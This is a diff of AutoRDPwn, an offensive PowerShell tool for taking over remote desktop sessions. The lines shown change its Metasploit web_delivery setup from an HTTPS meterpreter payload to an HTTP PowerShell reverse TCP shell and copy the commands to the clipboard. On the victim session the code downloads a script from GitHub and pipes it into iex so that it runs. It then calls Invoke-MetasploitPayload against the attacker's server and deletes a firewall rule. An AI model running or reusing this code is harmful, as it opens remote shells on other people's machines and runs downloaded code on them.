@@ -394,10 +394,10 @@ if($Language -in 'Spanish') {
         if($shell -like '4'){ $metasploit = "true" ; Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 
 	$metarandom = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_}) ; Write-Host
 	Write-host "$txt65" -NoNewLine -ForegroundColor Gray ; $metaserver = $Host.UI.ReadLine() ; $Host.UI.RawUI.ForegroundColor = 'Gray'
-	Write-Host ; Write-Host "$txt63" -ForegroundColor Red ; Write-Host ; Write-host "use exploit/multi/script/web_delivery"
-	Write-host "set SRVHOST $metaserver" ; Write-host "set SRVPORT 443" ; Write-host "set SSL true" ; Write-host "set target 2"
-        Write-host "set payload windows/meterpreter/reverse_https" ; Write-host "set LHOST $metaserver"
-	Write-host "set LPORT 4433" ; Write-host "set URIPATH $metarandom" ; Write-host "run -j"
+	Write-Host ; Write-Host "$txt63" -ForegroundColor Red ; Write-Host ; { Write-host "use exploit/multi/script/web_delivery"
+	Write-host "set SRVHOST $metaserver" ; Write-host "set SRVPORT 80" ; Write-host "set SSL false" ; Write-host "set target 2"
+        Write-host "set payload windows/powershell_reverse_tcp" ; Write-host "set LHOST $metaserver"
+	Write-host "set LPORT 4433" ; Write-host "set URIPATH $metarandom" ; Write-host "exploit -j" } | Set-Clipboard ; Get-Clipboard 
 	Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; sleep -milliseconds 2500 }
 
         if($shell -like 'X'){ $input = 'x' ; continue }
@@ -642,7 +642,7 @@ Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/mas
 if ($metasploit){ invoke-command -session $RDP[0] -scriptblock { Write-Host
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-MetasploitPayload.ps1" -UseBasicParsing | iex 
 Write-Host "==================== Metasploit Web Delivery =========================" -ForegroundColor Gray
-Invoke-MetasploitPayload -url https://$metaserver/$metarandom -verbose
+Invoke-MetasploitPayload -url http://$metaserver/$metarandom -verbose
 Write-Host "======================================================================" -ForegroundColor Gray ; Write-Host ; sleep -milliseconds 7500 }}
 
 if ($netcat -in 'local'){ invoke-command -session $RDP[0] -scriptblock { Write-Host ; netsh advfirewall firewall delete rule name="Powershell Remote Control Application" 2>&1> $null
